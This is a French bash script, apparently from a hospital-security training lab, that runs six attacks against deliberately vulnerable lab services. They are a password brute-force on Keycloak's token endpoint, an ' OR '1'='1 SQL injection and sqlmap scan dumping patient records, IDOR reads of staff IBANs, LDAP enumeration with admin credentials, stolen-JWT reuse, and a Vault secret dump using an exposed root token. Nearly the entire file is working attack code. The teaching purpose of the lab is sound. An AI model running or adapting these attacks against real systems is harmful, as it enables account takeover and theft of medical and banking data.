#!/bin/bash
# =============================================================================
# attaques.sh — Tests de sécurité Kali Linux — Projet 1 (sans SSI)
# Résultat attendu : toutes les attaques réussissent silencieusement
# Usage : docker exec -it hopital-kali bash /kali/attaques.sh
# =============================================================================

KC="http://keycloak:8080/realms/hopital/protocol/openid-connect/token"
DPI="http://dpi-backend:4000"
RH="http://rh-backend:4000"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; CYN='\033[0;36m'; NC='\033[0m'
OK="${GRN}[✓ RÉUSSI]${NC}"; KO="${RED}[✗ ÉCHOUÉ]${NC}"

sep() { echo -e "\n${CYN}══════════════════════════════════════════════════${NC}"; }

echo -e "${RED}"
cat << 'BANNER'
 _   _             _ _        _   _
| | | | ___  _ __ (_) |_ __ _| | | |_ ___  _ __ ___  ___
| |_| |/ _ \| '_ \| | __/ _` | | | __/ _ \| '_ ` _ \/ __|
|  _  | (_) | |_) | | || (_| | |_| || (_) | | | | | \__ \
|_| |_|\___/| .__/|_|\__\__,_|\___/ \__\___/|_| |_| |_|___/
            |_|
  HôpitalSim V1 — Tests d'intrusion (Phase sans SSI)
BANNER
echo -e "${NC}"
echo "Toutes les attaques doivent RÉUSSIR — aucun mécanisme de défense actif."
echo ""

# ═════════════════════════════════════════════════════════════════════════════
sep
echo -e "${YLW}A1 — Brute-force sur l'endpoint /token Keycloak${NC}"
echo "    Cible  : $KC"
echo "    Faille : pas de rate-limiting, pas de lockout"
echo ""

PASSWORDS=("password" "123456" "hopital" "Hopital2024!" "Jean2024!" "Marie2024!" "Pierre2024!")
FOUND=0

for USER in jean.dupont marie.manager pierre.employe; do
  for PASS in "${PASSWORDS[@]}"; do
    HTTP=$(curl -s -o /tmp/r.json -w "%{http_code}" -X POST "$KC" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "grant_type=password&client_id=kali-test&username=${USER}&password=${PASS}")
    if [ "$HTTP" = "200" ]; then
      TOKEN=$(python3 -c "import json; print(json.load(open('/tmp/r.json'))['access_token'])" 2>/dev/null)
      ROLES=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('roles',[]))" 2>/dev/null)
      echo -e "  $OK ${GRN}$USER${NC} / ${GRN}$PASS${NC} → Token obtenu | Rôles: $ROLES"
      echo "$TOKEN" > "/tmp/token_${USER}.txt"
      FOUND=$((FOUND+1))
      break
    fi
    sleep 0.05
  done
done

echo ""
echo -e "  Résultat : ${GRN}$FOUND comptes compromis${NC} | ${RED}0 blocage${NC} | ${RED}0 alerte${NC}"

# ═════════════════════════════════════════════════════════════════════════════
sep
echo -e "${YLW}A2 — Injection SQL sur GET /api/patients?search= (DPI)${NC}"
echo "    Faille : paramètre concaténé directement dans la requête SQL"
echo ""

TOKEN_DPI=$(cat /tmp/token_jean.dupont.txt 2>/dev/null)
if [ -z "$TOKEN_DPI" ]; then
  TOKEN_DPI=$(curl -s -X POST "$KC" \
    -d "grant_type=password&client_id=kali-test&username=jean.dupont&password=Jean2024!" \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
fi

# Injection basique : dump tous les patients
PAYLOAD="' OR '1'='1"
ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$PAYLOAD\"))")

RESULT=$(curl -s -H "Authorization: Bearer $TOKEN_DPI" \
  "$DPI/api/patients?search=$ENC")
COUNT=$(echo "$RESULT" | python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('patients',[])))" 2>/dev/null)

if [ "$COUNT" -gt 0 ] 2>/dev/null; then
  echo -e "  $OK Injection réussie → $COUNT dossiers patients exfiltrés"
  echo "$RESULT" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for p in d.get('patients',[]):
    print(f\"    NSS: {p.get('nss','?'):22} | {p.get('nom','?')} {p.get('prenom','?'):10} | {p.get('service','?')}\")
" 2>/dev/null
else
  echo -e "  $KO Résultat inattendu : $RESULT"
fi

echo ""

# SQLmap automatisé
echo "  [SQLmap] Scan automatique..."
sqlmap -u "$DPI/api/patients?search=test" \
  --headers="Authorization: Bearer $TOKEN_DPI" \
  --dbms=postgresql --batch --level=1 --risk=1 \
  --output-dir=/tmp/sqlmap 2>&1 \
  | grep -E "(injectable|Parameter|found|tables|ERROR)" | head -10

# ═════════════════════════════════════════════════════════════════════════════
sep
echo -e "${YLW}A3 — IDOR sur /api/paie/:id (RH) — Accès aux IBAN de collègues${NC}"
echo "    Faille : pas de vérification propriétaire sur la ressource"
echo ""

# Pierre (simple employé) lit les fiches de paie de ses collègues
TOKEN_RH=$(curl -s -X POST "$KC" \
  -d "grant_type=password&client_id=kali-test&username=pierre.employe&password=Pierre2024!" \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)

echo "  Connecté en tant que : pierre.employe (rôle: employe)"
echo "  Lecture des fiches de paie de tous les employés :"
echo ""

for ID in 1 2 3 4 5 6; do
  RESULT=$(curl -s -H "Authorization: Bearer $TOKEN_RH" "$RH/api/paie/$ID")
  FICHE=$(echo "$RESULT" | python3 -c "
import json,sys
d=json.load(sys.stdin)
fiches=d.get('fiches',[])
if fiches:
    f=fiches[0]
    print(f\"ID $ID | Salaire net: {f.get('salaire_net','?')}€ | IBAN: {f.get('iban','?')}\")
" 2>/dev/null)
  [ -n "$FICHE" ] && echo -e "  $OK $FICHE" || echo "  ID $ID → aucune fiche"
done

echo ""
echo -e "  Résultat : ${RED}IBAN de tout le personnel exposés${NC} | ${RED}0 alerte${NC}"

# ═════════════════════════════════════════════════════════════════════════════
sep
echo -e "${YLW}A4 — Énumération LDAP${NC}"
echo "    Faille : LDAP accessible en lecture depuis le réseau"
echo ""

echo "  Dump du personnel hospitalier :"
ldapsearch -x -H ldap://openldap:389 \
  -D "cn=admin,dc=utopios,dc=local" -w adminldap \
  -b "ou=People,dc=utopios,dc=local" \
  "(objectClass=inetOrgPerson)" uid cn mail employeeType \
  2>/dev/null | grep -E "^(uid|cn|mail|employeeType):" | \
  awk 'BEGIN{ORS=""} /^uid/{if(NR>1)print "\n"; print "  → "} {print $0" | "} END{print "\n"}'

echo ""
echo "  Groupes :"
ldapsearch -x -H ldap://openldap:389 \
  -D "cn=admin,dc=utopios,dc=local" -w adminldap \
  -b "ou=Groups,dc=utopios,dc=local" \
  "(objectClass=groupOfNames)" cn \
  2>/dev/null | grep "^cn:" | awk '{print "  → Groupe: "$2}'

echo ""
echo -e "  Résultat : ${RED}Organigramme complet exposé${NC} | ${RED}0 alerte${NC}"

# ═════════════════════════════════════════════════════════════════════════════
sep
echo -e "${YLW}A5 — Vol et réutilisation de JWT${NC}"
echo "    Faille : tokens valides 1h, HTTP non chiffré, pas de révocation"
echo ""

STOLEN=$(cat /tmp/token_jean.dupont.txt 2>/dev/null)
if [ -n "$STOLEN" ]; then
  # Décoder le payload
  echo "  Contenu du JWT intercepté (en clair, base64) :"
  echo "$STOLEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(f\"    Utilisateur : {d.get('preferred_username','?')}\")
print(f\"    Email       : {d.get('email','?')}\")
print(f\"    Rôles       : {d.get('roles',[])}\")
print(f\"    Expire      : dans {max(0,(d.get('exp',0)-__import__('time').time())/60):.0f} minutes\")
" 2>/dev/null

  echo ""
  echo "  Utilisation du token volé pour accéder au DPI :"
  COUNT=$(curl -s -H "Authorization: Bearer $STOLEN" "$DPI/api/patients" \
    | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('patients',[])))" 2>/dev/null)
  echo -e "  $OK $COUNT dossiers accessibles avec le token volé"
fi

# ═════════════════════════════════════════════════════════════════════════════
sep
echo -e "${YLW}A6 — Accès Vault (token root exposé en variable d'env)${NC}"
echo "    Faille : myroot_token_12345 visible dans docker-compose.yml"
echo ""

VAULT="http://hopital-vault:8200"
VAULT_TOKEN="myroot_token_12345"

for SECRET in dpi/db rdv/db rh/db keycloak; do
  RESULT=$(curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
    "$VAULT/v1/hopital/data/$SECRET" 2>/dev/null)
  DATA=$(echo "$RESULT" | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin).get('data',{}).get('data',{})
  print(' | '.join(f'{k}={v}' for k,v in d.items()))
except: print('?')
" 2>/dev/null)
  echo -e "  $OK hopital/$SECRET → $DATA"
done

echo ""
echo -e "  Résultat : ${RED}Tous les secrets BDD et Keycloak obtenus${NC} | ${RED}0 alerte${NC}"

# ═════════════════════════════════════════════════════════════════════════════
sep
echo ""
echo -e "${YLW}RÉSUMÉ — Projet V1 (sans SSI)${NC}"
echo ""
printf "  %-40s %-15s %-10s\n" "Attaque" "Résultat" "Détectée"
printf "  %-40s %-15s %-10s\n" "──────────────────────────────────────" "───────────────" "──────────"
printf "  %-40s ${GRN}%-15s${NC} ${RED}%-10s${NC}\n" "A1 — Brute-force Keycloak /token"       "✓ Réussie"  "Non"
printf "  %-40s ${GRN}%-15s${NC} ${RED}%-10s${NC}\n" "A2 — Injection SQL DPI"                  "✓ Réussie"  "Non"
printf "  %-40s ${GRN}%-15s${NC} ${RED}%-10s${NC}\n" "A3 — IDOR fiches de paie (IBAN)"         "✓ Réussie"  "Non"
printf "  %-40s ${GRN}%-15s${NC} ${RED}%-10s${NC}\n" "A4 — Énumération LDAP"                   "✓ Réussie"  "Non"
printf "  %-40s ${GRN}%-15s${NC} ${RED}%-10s${NC}\n" "A5 — Vol et réutilisation JWT"           "✓ Réussie"  "Non"
printf "  %-40s ${GRN}%-15s${NC} ${RED}%-10s${NC}\n" "A6 — Dump Vault (token root exposé)"     "✓ Réussie"  "Non"
echo ""
echo -e "  → ${RED}6/6 attaques réussies${NC} · ${RED}0 alerte générée${NC}"
echo -e "  → Passer au Projet V2 pour voir ces attaques bloquées."
echo ""
